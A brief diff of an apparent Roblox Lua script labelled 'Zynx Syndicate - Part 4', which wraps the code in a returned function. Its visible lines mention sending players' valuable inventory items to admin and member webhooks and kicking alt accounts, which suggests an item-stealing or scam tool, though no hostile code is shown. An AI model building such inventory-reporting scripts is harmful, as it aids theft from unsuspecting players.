@@ -1,3 +1,4 @@
+return function()
 -- Zynx Syndicate - Part 4: VALUABLE ITEMS ONLY (ADMIN + MEMBER WEBHOOKS)
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
@@ -700,4 +701,6 @@ if success then
     print("🚀 Webhook sent successfully based on inventory priority!")
 else
     print("💀 Player kicked - Alt account detected")
+end
+
 end
